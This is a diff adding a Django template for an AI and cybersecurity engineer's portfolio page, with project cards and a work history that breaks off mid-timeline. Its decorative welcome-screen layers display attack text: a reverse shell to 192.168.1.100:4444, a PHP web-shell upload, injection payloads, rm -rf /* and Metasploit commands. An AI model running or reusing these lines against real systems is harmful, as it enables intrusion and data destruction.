@@ -1,0 +1,1240 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ config.title }}</title>
+    <meta name="description" content="{{ config.subtitle }}">
+    
+    <!-- CSRF Token for Django forms -->
+    <meta name="csrf-token" content="{{ csrf_token }}">
+    
+    <!-- Favicon - Adrian's Profile Image -->
+    <link rel="icon" type="image/png" sizes="32x32" href="{% static 'images/b64551a3-0078-4b1a-8a88-76958aca08f1.png' %}">
+    <link rel="icon" type="image/png" sizes="16x16" href="{% static 'images/b64551a3-0078-4b1a-8a88-76958aca08f1.png' %}">
+    <link rel="apple-touch-icon" sizes="180x180" href="{% static 'images/b64551a3-0078-4b1a-8a88-76958aca08f1.png' %}">
+    <link rel="shortcut icon" href="{% static 'images/b64551a3-0078-4b1a-8a88-76958aca08f1.png' %}">
+    
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Modular CSS Files -->
+    <link rel="stylesheet" href="{% static 'css/main.css' %}">
+    <link rel="stylesheet" href="{% static 'css/glassmorphism.css' %}">
+    <link rel="stylesheet" href="{% static 'css/components.css' %}">
+    <link rel="stylesheet" href="{% static 'css/theme-switcher.css' %}">
+    <link rel="stylesheet" href="{% static 'css/ai-ml-stack-effects.css' %}">
+    <link rel="stylesheet" href="{% static 'css/sidebar-navigation.css' %}">
+</head>
+<body>
+    <!-- Welcome Screen / Antesala -->
+    <div class="welcome-screen" id="welcome-screen">
+        <div class="welcome-background">
+            <div class="diagonal-divider"></div>
+        </div>
+        
+        <!-- Dual Theme Indicators -->
+        <div class="theme-indicators">
+            <div class="theme-indicator ai">
+                <div class="theme-icon">
+                    <i class="fas fa-brain"></i>
+                </div>
+                <div class="theme-label-dual">AI Engineer</div>
+            </div>
+            <div class="theme-indicator cyber">
+                <div class="theme-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="theme-label-dual">Cybersecurity</div>
+            </div>
+        </div>
+        
+        <div class="welcome-content">
+            <div class="welcome-avatar">
+                <img src="{% static 'images/b64551a3-0078-4b1a-8a88-76958aca08f1.png' %}" alt="Adrian Infantes Avatar" class="avatar-image">
+                <div class="avatar-glow"></div>
+            </div>
+            <div class="welcome-text">
+                <h1 class="welcome-title">Welcome to the profile of</h1>
+                <h2 class="welcome-name">Adrian Infantes</h2>
+                <p class="welcome-subtitle">AI Engineer & Cybersecurity Specialist</p>
+            </div>
+            <div class="welcome-action">
+                <button class="enter-button" id="enter-portfolio">
+                    <span>Explore Portfolio</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+                <div class="click-hint">
+                    <i class="fas fa-hand-pointer"></i>
+                    <span>Click to continue</span>
+                </div>
+            </div>
+        </div>
+        <div class="welcome-particles">
+            <!-- Blue Matrix Layers (AI Side) -->
+            <div class="matrix-layer-1">01010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110</div>
+            <div class="matrix-layer-2">AI CNN RNN LSTM GAN VAE GPT BERT T5 XLNet RoBERTa DistilBERT ALBERT BigBird Electra DeBERTa AdaBoost XGBoost LightGBM CatBoost RandomForest SVM KNN DecisionTree NaiveBayes LogisticRegression LinearRegression RidgeRegression LassoRegression ElasticNet PCA SVD ICA t-SNE UMAP K-Means DBSCAN HierarchicalClustering GaussianMixture TensorFlow PyTorch Keras Scikit-learn Numpy Pandas Matplotlib Seaborn Plotly OpenCV NLTK spaCy Transformers Hugging</div>
+            <div class="matrix-layer-3">01101001011100110101110010100111010011101010010110011011100101101001011100110101110010100111010011101010010110011011100101101001011100110101110010100111010011101010010110011011100101101001011100110101110010100111010011101010010110011011100101101001011100110101110010100111010011101010010110011011100101101001011100110101110010100111010011101010010110011011100101101001011100110101110010100111010011101010010110</div>
+            <div class="matrix-layer-4">Python Flask Django FastAPI Docker Kubernetes AWS GCP Azure MLflow Airflow Jupyter Colab CUDA cuDNN TensorRT ONNX NVIDIA-Docker Triton Inference Server Apache Spark Dask Ray Distributed Computing Multi-GPU Training Model Serving API Gateway Load Balancer Auto-scaling Cloud Functions Lambda Edge Computing IoT Neural Networks Deep Learning Machine Learning Data Science Analytics Business Intelligence ETL Pipeline Data Warehouse Feature Store</div>
+            <div class="matrix-layer-5">11000110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011001101110010110100101110011010111001010011101001110101001011</div>
+            <div class="matrix-layer-6">import tensorflow as tf
+from sklearn.model_selection import train_test_split
+import numpy as np
+import pandas as pd
+from transformers import AutoModel, AutoTokenizer
+from keras.layers import Dense, LSTM, Dropout
+model = tf.keras.Sequential()
+model.add(Dense(128, activation='relu'))
+model.compile(optimizer='adam', loss='mse')
+X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)
+model.fit(X_train, y_train, epochs=100, batch_size=32)
+predictions = model.predict(X_test)</div>
+            
+            <!-- Red Matrix Layers (Cybersecurity Side) -->
+            <div class="matrix-layer-red-1">def exploit():
+    import os
+    import sys
+    import socket
+    0xDEADBEEF
+    while True:
+        try:
+            connect()
+            inject_payload()
+            escalate_privileges()
+        except:
+            continue
+    return shell_access
+
+rm -rf /*
+sudo su root
+chmod 777 /etc/passwd
+./exploit.sh &
+nohup backdoor.py &</div>
+            <div class="matrix-layer-red-2">nmap -sS -O -p- target.com
+masscan -p1-65535 192.168.1.0/24
+nikto -h http://target.com
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+hydra -l admin -P passwords.txt ssh://target.com
+john --wordlist=rockyou.txt hashes.txt
+hashcat -m 0 -a 0 hashes.txt rockyou.txt</div>
+            <div class="matrix-layer-red-3">SELECT * FROM users WHERE id=1 UNION SELECT null,user(),version(),null--
+'; DROP TABLE users; --
+' OR '1'='1' --
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;?php system($_GET['cmd']); ?&gt;
+../../../../etc/passwd
+http://target.com/../../../../../../etc/passwd%00
+SSTI: {7*7} template injection
+LDAP Injection: *)(uid=*))(|(uid=*
+Command Injection: ; cat /etc/passwd #</div>
+            <div class="matrix-layer-red-4">POST /upload HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data
+
+--boundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+GET /shell.php?cmd=whoami HTTP/1.1
+Host: target.com</div>
+            <div class="matrix-layer-red-5">import requests
+import socket
+import subprocess
+import base64
+
+payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ=="
+decoded = base64.b64decode(payload)
+exec(decoded)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.1.100", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/bash", "-i"])</div>
+            <div class="matrix-layer-red-6">msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+
+use auxiliary/scanner/smb/smb_version
+use exploit/windows/smb/ms17_010_eternalblue
+use post/windows/gather/hashdump
+use post/windows/gather/enum_logged_on_users
+
+beef-xss
+setoolkit
+mitmproxy
+burpsuite --proxy-config
+wireshark -i eth0
+tcpdump -i eth0 -w capture.pcap</div>
+        </div>
+    </div>
+
+    <!-- Main Portfolio Content (Hidden initially) -->
+    <div class="portfolio-content" id="portfolio-content">
+        <!-- Enhanced Floating particles -->
+        <div class="floating-particles">
+            <!-- Base layer particles -->
+            <div class="particle" style="left: 5%; width: 4px; height: 4px; animation-delay: 0s; animation-duration: 20s;"></div>
+            <div class="particle" style="left: 12%; width: 3px; height: 3px; animation-delay: 1s; animation-duration: 18s;"></div>
+            <div class="particle" style="left: 20%; width: 6px; height: 6px; animation-delay: 2s; animation-duration: 22s;"></div>
+            <div class="particle" style="left: 28%; width: 2px; height: 2px; animation-delay: 3s; animation-duration: 16s;"></div>
+            <div class="particle" style="left: 35%; width: 5px; height: 5px; animation-delay: 4s; animation-duration: 24s;"></div>
+            <div class="particle" style="left: 42%; width: 4px; height: 4px; animation-delay: 5s; animation-duration: 19s;"></div>
+            <div class="particle" style="left: 50%; width: 3px; height: 3px; animation-delay: 6s; animation-duration: 21s;"></div>
+            <div class="particle" style="left: 58%; width: 7px; height: 7px; animation-delay: 7s; animation-duration: 17s;"></div>
+            <div class="particle" style="left: 65%; width: 2px; height: 2px; animation-delay: 8s; animation-duration: 23s;"></div>
+            <div class="particle" style="left: 72%; width: 5px; height: 5px; animation-delay: 9s; animation-duration: 20s;"></div>
+            <div class="particle" style="left: 80%; width: 4px; height: 4px; animation-delay: 10s; animation-duration: 18s;"></div>
+            <div class="particle" style="left: 87%; width: 3px; height: 3px; animation-delay: 11s; animation-duration: 25s;"></div>
+            <div class="particle" style="left: 93%; width: 6px; height: 6px; animation-delay: 12s; animation-duration: 19s;"></div>
+            
+            <!-- Secondary layer for depth -->
+            <div class="particle" style="left: 8%; width: 2px; height: 2px; animation-delay: 13s; animation-duration: 22s; opacity: 0.6;"></div>
+            <div class="particle" style="left: 16%; width: 4px; height: 4px; animation-delay: 14s; animation-duration: 20s; opacity: 0.7;"></div>
+            <div class="particle" style="left: 24%; width: 3px; height: 3px; animation-delay: 15s; animation-duration: 18s; opacity: 0.5;"></div>
+            <div class="particle" style="left: 32%; width: 5px; height: 5px; animation-delay: 16s; animation-duration: 21s; opacity: 0.8;"></div>
+            <div class="particle" style="left: 40%; width: 2px; height: 2px; animation-delay: 17s; animation-duration: 19s; opacity: 0.6;"></div>
+            <div class="particle" style="left: 48%; width: 6px; height: 6px; animation-delay: 18s; animation-duration: 23s; opacity: 0.7;"></div>
+            <div class="particle" style="left: 56%; width: 3px; height: 3px; animation-delay: 19s; animation-duration: 17s; opacity: 0.5;"></div>
+            <div class="particle" style="left: 64%; width: 4px; height: 4px; animation-delay: 20s; animation-duration: 24s; opacity: 0.8;"></div>
+            <div class="particle" style="left: 76%; width: 2px; height: 2px; animation-delay: 21s; animation-duration: 20s; opacity: 0.6;"></div>
+            <div class="particle" style="left: 84%; width: 5px; height: 5px; animation-delay: 22s; animation-duration: 18s; opacity: 0.7;"></div>
+            <div class="particle" style="left: 91%; width: 3px; height: 3px; animation-delay: 23s; animation-duration: 22s; opacity: 0.5;"></div>
+            
+            <!-- Micro particles for ambient effect -->
+            <div class="particle" style="left: 15%; width: 1px; height: 1px; animation-delay: 2s; animation-duration: 30s; opacity: 0.4;"></div>
+            <div class="particle" style="left: 25%; width: 1px; height: 1px; animation-delay: 5s; animation-duration: 28s; opacity: 0.3;"></div>
+            <div class="particle" style="left: 35%; width: 1px; height: 1px; animation-delay: 8s; animation-duration: 32s; opacity: 0.4;"></div>
+            <div class="particle" style="left: 45%; width: 1px; height: 1px; animation-delay: 11s; animation-duration: 29s; opacity: 0.3;"></div>
+            <div class="particle" style="left: 55%; width: 1px; height: 1px; animation-delay: 14s; animation-duration: 31s; opacity: 0.4;"></div>
+            <div class="particle" style="left: 65%; width: 1px; height: 1px; animation-delay: 17s; animation-duration: 27s; opacity: 0.3;"></div>
+            <div class="particle" style="left: 75%; width: 1px; height: 1px; animation-delay: 20s; animation-duration: 33s; opacity: 0.4;"></div>
+            <div class="particle" style="left: 85%; width: 1px; height: 1px; animation-delay: 23s; animation-duration: 26s; opacity: 0.3;"></div>
+        </div>
+
+        <!-- Theme Switcher will be added dynamically by JavaScript -->
+
+        <!-- Hamburger Menu Button -->
+        <button class="hamburger-btn" id="hamburger-btn" aria-label="Toggle navigation menu">
+            <span class="hamburger-line"></span>
+            <span class="hamburger-line"></span>
+            <span class="hamburger-line"></span>
+        </button>
+
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar-nav" id="sidebar-nav">
+            <div class="sidebar-header">
+                <div class="sidebar-avatar">
+                    <img src="{% static 'images/b64551a3-0078-4b1a-8a88-76958aca08f1.png' %}" alt="Adrian Infantes Avatar">
+                </div>
+                <h3 class="sidebar-name">Adrian Infantes</h3>
+                <p class="sidebar-title">AI Engineer & Cybersecurity</p>
+            </div>
+            
+            <ul class="sidebar-menu">
+                {% for item in navigation %}
+                <li class="sidebar-menu-item">
+                    <a href="{{ item.url }}" class="sidebar-menu-link">
+                        <i class="{{ item.icon }}"></i>
+                        <span>{{ item.name }}</span>
+                    </a>
+                </li>
+                {% endfor %}
+            </ul>
+            
+            <div class="sidebar-footer">
+                <div class="sidebar-social">
+                    {% for key, social in social_links.items %}
+                    <a href="{{ social.url }}" target="_blank" title="{{ social.name }}" class="sidebar-social-link">
+                        <i class="{{ social.icon }}"></i>
+                    </a>
+                    {% endfor %}
+                </div>
+            </div>
+        </nav>
+
+        <!-- Sidebar Overlay -->
+        <div class="sidebar-overlay" id="sidebar-overlay"></div>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Hero Section -->
+            <section class="hero" id="home">
+                <div class="container">
+                    <h1>{{ personal_info.name }}</h1>
+                    <p class="text-highlight">{{ personal_info.subtitle }}</p>
+                    
+                    <!-- Hero Banner with Image -->
+                    <div class="hero-banner">
+                        <div class="hero-banner-content">
+                            <div class="hero-banner-image">
+                                <img src="{% static 'images/b64551a3-0078-4b1a-8a88-76958aca08f1.png' %}" alt="Adrian Infantes Professional Banner" loading="lazy">
+                                <div class="hero-banner-overlay"></div>
+                            </div>
+                            <div class="hero-banner-info">
+                                <div class="banner-badge">
+                                    <i class="fas fa-cloud"></i>
+                                    <span>Enterprise Certified</span>
+                                </div>
+                                <h3 class="banner-title">Architecting Intelligent Cloud Solutions</h3>
+                                <p class="banner-subtitle">Senior AI Engineer and Cloud Solutions Architect with proven experience in enterprise-scale cloud infrastructure, machine learning systems, and data-driven solutions. Specialized in designing robust and scalable architectures that drive operational excellence and business innovation.</p>
+                                <div class="banner-stats">
+                                    <div class="banner-stat">
+                                        <span class="stat-number">5+</span>
+                                        <span class="stat-label">Cloud Certifications</span>
+                                    </div>
+                                    <div class="banner-stat">
+                                        <span class="stat-number">50+</span>
+                                        <span class="stat-label">Enterprise Projects</span>
+                                    </div>
+                                    <div class="banner-stat">
+                                        <span class="stat-number">99.9%</span>
+                                        <span class="stat-label">Solution Uptime</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="#contact" class="btn btn-primary">Get In Touch</a>
+                </div>
+            </section>
+
+            <div class="container">
+                <!-- Featured Projects Section -->
+                <section id="projects" class="section">
+                    <h2><i class="fas fa-laptop-code icon"></i>Featured Projects</h2>
+                    <div class="projects-grid">
+                        <!-- Limitless OSINT Tool - Cybersecurity Intelligence Platform -->
+                        <div class="project-card">
+                            <div class="project-image">
+                                <img src="{% static 'images/20250531_0021_Cyber Intelligence Dashboard_simple_compose_01jwhmjqphfcntqcyrjqk2azjx.gif' %}" alt="Limitless OSINT Tool Dashboard" loading="lazy" class="project-gif">
+                                <div class="project-overlay">
+                                    <div class="project-play-btn">
+                                        <i class="fas fa-play"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="project-content">
+                                <h3>🕵️ Limitless OSINT Tool</h3>
+                                <p>Advanced cyber intelligence tool with RAG (Retrieval Augmented Generation) capabilities for document analysis, insight extraction, and natural language queries. Designed for cybersecurity and intelligence professionals.</p>
+                                <div class="tech-tags">
+                                    <span class="tech-tag">Python</span>
+                                    <span class="tech-tag">Streamlit</span>
+                                    <span class="tech-tag">ChromaDB</span>
+                                    <span class="tech-tag">OpenAI</span>
+                                    <span class="tech-tag">RAG</span>
+                                    <span class="tech-tag">NLP</span>
+                                    <span class="tech-tag">Vector Search</span>
+                                    <span class="tech-tag">Docker</span>
+                                    <span class="tech-tag">OSINT</span>
+                                    <span class="tech-tag">Sentence Transformers</span>
+                                </div>
+                                <div class="project-links">
+                                    <a href="https://github.com/infantesromeroadrian/Osint-Tool-LimitLess" class="btn" target="_blank" rel="noopener">
+                                        <i class="fab fa-github"></i> Code
+                                    </a>
+                                    <a href="https://github.com/infantesromeroadrian/Osint-Tool-LimitLess" class="btn" target="_blank" rel="noopener">
+                                        <i class="fas fa-external-link-alt"></i> Demo
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Dynamic Projects from Django Context -->
+                        {% for project in featured_projects %}
+                        <div class="project-card">
+                            {% if project.image_url %}
+                            <div class="project-image">
+                                <img src="{{ project.image_url }}" alt="{{ project.title }}" loading="lazy" class="project-gif">
+                                <div class="project-overlay">
+                                    <div class="project-play-btn">
+                                        <i class="fas fa-play"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            {% endif %}
+                            <div class="project-content">
+                                <h3>{{ project.title }}</h3>
+                                <p>{{ project.description }}</p>
+                                <div class="tech-tags">
+                                    {% for tech in project.technologies %}
+                                    <span class="tech-tag">{{ tech }}</span>
+                                    {% endfor %}
+                                </div>
+                                <div class="project-links">
+                                    {% if project.github_url %}
+                                    <a href="{{ project.github_url }}" class="btn" target="_blank" rel="noopener">
+                                        <i class="fab fa-github"></i> Code
+                                    </a>
+                                    {% endif %}
+                                    
+                                    <!-- Special demo URL for Hospital de Agentes AI project -->
+                                    {% if "Hospital" in project.title and "Agentes" in project.title %}
+                                    <a href="http://127.0.0.1:3567" class="btn" target="_blank" rel="noopener">
+                                        <i class="fas fa-external-link-alt"></i> Demo
+                                    </a>
+                                    <!-- Special demo URL for Herramienta de Análisis Geográfico OSINT project -->
+                                    {% elif "Herramienta" in project.title and "Geográfico" in project.title and "OSINT" in project.title %}
+                                    <a href="http://localhost:4001" class="btn" target="_blank" rel="noopener">
+                                        <i class="fas fa-external-link-alt"></i> Demo
+                                    </a>
+                                    {% elif project.demo_url %}
+                                    <a href="{{ project.demo_url }}" class="btn" target="_blank">
+                                        <i class="fas fa-external-link-alt"></i> Demo
+                                    </a>
+                                    {% endif %}
+                                </div>
+                            </div>
+                        </div>
+                        {% endfor %}
+                    </div>
+                </section>
+                
+                <!-- Professional Timeline Section -->
+                <section id="timeline" class="section">
+                    <!-- Timeline Progress Indicator -->
+                    <div class="timeline-progress-indicator" id="timeline-progress">
+                        <div class="timeline-progress-fill" id="timeline-progress-fill"></div>
+                    </div>
+                    
+                    <!-- Timeline Navigation Mini-Map -->
+                    <div class="timeline-navigator" id="timeline-navigator">
+                        <div class="timeline-nav-item" data-target="bbva" onclick="scrollToTimeline('bbva')">
+                            <span class="nav-year">2024</span>
+                            <span class="nav-company">BBVA</span>
+                        </div>
+                        <div class="timeline-nav-item" data-target="ecoembes" onclick="scrollToTimeline('ecoembes')">
+                            <span class="nav-year">2020-24</span>
+                            <span class="nav-company">Ecoembes</span>
+                        </div>
+                        <div class="timeline-nav-item" data-target="capgemini" onclick="scrollToTimeline('capgemini')">
+                            <span class="nav-year">2017-20</span>
+                            <span class="nav-company">Capgemini</span>
+                        </div>
+                    </div>
+                    
+                    <div class="timeline-section">
+                        <div class="timeline-header">
+                            <h2><i class="fas fa-briefcase icon"></i>Professional Experience</h2>
+                            <p class="timeline-subtitle">My journey in AI and Machine Learning</p>
+                        </div>
+                        
+                        <div class="timeline-container">
+                            <!-- BBVA Experience - Most Recent -->
+                            <div class="timeline-item" data-aos="fade-up" data-company="bbva" id="timeline-bbva">
+                                <div class="timeline-content">
+                                    <div class="timeline-company">
+                                        <div class="company-logo">
+                                            <i class="fas fa-university"></i>
+                                        </div>
+                                        <div class="company-info">
+                                            <h3 class="position-title">AI/ML Engineer - Senior</h3>
+                                            <h4 class="company-name">BBVA AI Factory</h4>
+                                            <div class="timeline-meta">
+                                                <span class="timeline-duration">
+                                                    <i class="fas fa-calendar-alt"></i>
+                                                    Jan. 2024 - present · 1 year 5 months
+                                                </span>
+                                                <span class="timeline-location">
+                                                    <i class="fas fa-map-marker-alt"></i>
+                                                    Madrid, Spain · Remote
+                                                </span>
+                                                <span class="timeline-type">
+                                                    <i class="fas fa-clock"></i>
+                                                    Full-time
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Duration Visualization -->
+                                    <div class="duration-visual">
+                                        <div class="duration-bar"> <!-- Auto width to fit content -->
+                                            <span class="duration-label">1 year 5 months</span>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="timeline-description">
+                                        <p class="main-description">
+                                            💼 Development of advanced generative AI, NLP and MLOps solutions for critical applications in banking and customer experience.
+                                        </p>
+                                        
+                                        <!-- Brief Summary - Always Visible -->
+                                        <div class="timeline-summary">
+                                            <div class="summary-highlights">
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">+15%</span>
+                                                    <span class="highlight-label">LLM Accuracy</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">-35%</span>
+                                                    <span class="highlight-label">Inference Costs</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">99.95%</span>
+                                                    <span class="highlight-label">Availability</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">+500K</span>
+                                                    <span class="highlight-label">Queries/month</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Expand/Collapse Button -->
+                                        <div class="timeline-expand-btn" onclick="toggleTimelineDetails('bbva-details')">
+                                            <span class="expand-text">View full details</span>
+                                            <i class="fas fa-chevron-down expand-icon"></i>
+                                        </div>
+                                        
+                                        <!-- Collapsible Details -->
+                                        <div class="timeline-details" id="bbva-details">
+                                            <div class="achievements-grid">
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-brain"></i>
+                                                    </div>
+                                                    <h5>Arquitecturas LLM para Banca (RAG + CUDA)</h5>
+                                                    <ul>
+                                                        <li>Diseño de sistemas financieros con GPT-4 y LLaMA-3, integrando Pinecone y Azure Cognitive Search</li>
+                                                        <li>Optimización en GPU NVIDIA con cuantización GGUF (-20% latencia)</li>
+                                                        <li>+15% precisión en modelos híbridos (PyTorch + Hugging Face)</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-comments"></i>
+                                                    </div>
+                                                    <h5>NLP Conversacional y Experiencia del Cliente</h5>
+                                                    <ul>
+                                                        <li>Análisis de sentimiento con BERT en tiempo real (+18% satisfacción)</li>
+                                                        <li>Pipelines multilingües escalables (spaCy + Azure Speech), +10M interacciones</li>
+                                                        <li>-35% en costos de inferencia gracias a optimización de modelos</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-link"></i>
+                                                    </div>
+                                                    <h5>Núcleo Conversacional con LangChain</h5>
+                                                    <ul>
+                                                        <li>Asistente IA con Dialogflow + LangChain, +500K consultas/mes</li>
+                                                        <li>Autoescalado con Kubernetes, 99.95% disponibilidad</li>
+                                                        <li>Clustering de intenciones: -40% tareas repetitivas</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-cogs"></i>
+                                                    </div>
+                                                    <h5>MLOps Empresarial (AzureML + MLflow)</h5>
+                                                    <ul>
+                                                        <li>CI/CD automatizado, -40% en tiempos de producción</li>
+                                                        <li>Monitorización de drift con Evidently AI, SLA del 99.9%</li>
+                                                        <li>Unificación de +50 modelos cloud-native</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-chart-line"></i>
+                                                    </div>
+                                                    <h5>Modelos de Riesgo Crediticio</h5>
+                                                    <ul>
+                                                        <li>+22% AUC-ROC con XGBoost + NLP</li>
+                                                        <li>Procesamiento de 50K documentos/día con ElasticSearch</li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="tech-stack">
+                                                <h6>Tech Stack Principal:</h6>
+                                                <div class="tech-tags">
+                                                    <span class="tech-tag">GPT-4</span>
+                                                    <span class="tech-tag">LLaMA-3</span>
+                                                    <span class="tech-tag">PyTorch</span>
+                                                    <span class="tech-tag">Hugging Face</span>
+                                                    <span class="tech-tag">LangChain</span>
+                                                    <span class="tech-tag">Azure ML</span>
+                                                    <span class="tech-tag">MLflow</span>
+                                                    <span class="tech-tag">Kubernetes</span>
+                                                    <span class="tech-tag">NVIDIA CUDA</span>
+                                                    <span class="tech-tag">ElasticSearch</span>
+                                                    <span class="tech-tag">Pinecone</span>
+                                                    <span class="tech-tag">XGBoost</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Ecoembes Experience - Previous -->
+                            <div class="timeline-item" data-aos="fade-up" data-company="ecoembes" id="timeline-ecoembes">
+                                <div class="timeline-dot">
+                                    <div class="timeline-dot-inner"></div>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-company">
+                                        <div class="company-logo ecoembes-logo">
+                                            <i class="fas fa-recycle"></i>
+                                        </div>
+                                        <div class="company-info">
+                                            <h3 class="position-title">Machine Learning Engineer - Mid</h3>
+                                            <h4 class="company-name">Ecoembes</h4>
+                                            <div class="timeline-meta">
+                                                <span class="timeline-duration">
+                                                    <i class="fas fa-calendar-alt"></i>
+                                                    feb. 2020 - ene. 2024 · 4 years experience
+                                                </span>
+                                                <span class="timeline-location">
+                                                    <i class="fas fa-map-marker-alt"></i>
+                                                    Madrid, Spain · Hybrid
+                                                </span>
+                                                <span class="timeline-type">
+                                                    <i class="fas fa-clock"></i>
+                                                    Full-time
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Duration Visualization -->
+                                    <div class="duration-visual">
+                                        <div class="duration-bar"> <!-- Auto width to fit content -->
+                                            <span class="duration-label">4 years experience</span>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="timeline-description">
+                                        <p class="main-description">
+                                            💼 Implementation of artificial intelligence solutions applied to sustainability, logistics efficiency and conversational experience.
+                                        </p>
+                                        
+                                        <!-- Brief Summary - Always Visible -->
+                                        <div class="timeline-summary">
+                                            <div class="summary-highlights">
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">89%</span>
+                                                    <span class="highlight-label">Precisión Chatbot</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">-40%</span>
+                                                    <span class="highlight-label">Falsos Positivos</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">85%</span>
+                                                    <span class="highlight-label">Clasificación IA</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">-25%</span>
+                                                    <span class="highlight-label">Km Recorridos</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Expand/Collapse Button -->
+                                        <div class="timeline-expand-btn" onclick="toggleTimelineDetails('ecoembes-details')">
+                                            <span class="expand-text">Ver detalles completos</span>
+                                            <i class="fas fa-chevron-down expand-icon"></i>
+                                        </div>
+                                        
+                                        <!-- Collapsible Details -->
+                                        <div class="timeline-details" id="ecoembes-details">
+                                            <div class="achievements-grid">
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-robot"></i>
+                                                    </div>
+                                                    <h5>Evolución de Chatbots Pre-Transformer (2020–2022)</h5>
+                                                    <ul>
+                                                        <li>Migración de arquitecturas RNN/LSTM a BERT-base multilingüe (Esp/Eng)</li>
+                                                        <li>Pipeline completo desde Azure Databricks hasta Azure Container Instances</li>
+                                                        <li>Primer chatbot bancario español: 89% precisión en detección de intención</li>
+                                                        <li>Reducción del 40% en falsos positivos aplicando Word2Vec + CRF para NER</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-camera"></i>
+                                                    </div>
+                                                    <h5>Revolución en Clasificación de Residuos (2021–2023)</h5>
+                                                    <ul>
+                                                        <li>Arquitectura híbrida: Inception-v3 (TensorFlow 2.4) + Random Forest para 12 clases</li>
+                                                        <li>Dataset de 45K imágenes, preprocesado con OpenCV 4.2 y Azure Synapse</li>
+                                                        <li>Integración IoT: Cámaras industriales vía Azure IoT Hub</li>
+                                                        <li>85% precisión en producción, +15% sobre soluciones manuales</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-route"></i>
+                                                    </div>
+                                                    <h5>Optimización Logística Histórica (2020–2024)</h5>
+                                                    <ul>
+                                                        <li>Fase 1: Algoritmos GRASP + Tabu Search en Python puro</li>
+                                                        <li>Fase 2: Migración a Google OR-Tools con Azure Batch</li>
+                                                        <li>Integración +50 APIs REST de telemetría vía Azure API Management</li>
+                                                        <li>Resultados: -25% km recorridos, -18% emisiones CO₂</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-cogs"></i>
+                                                    </div>
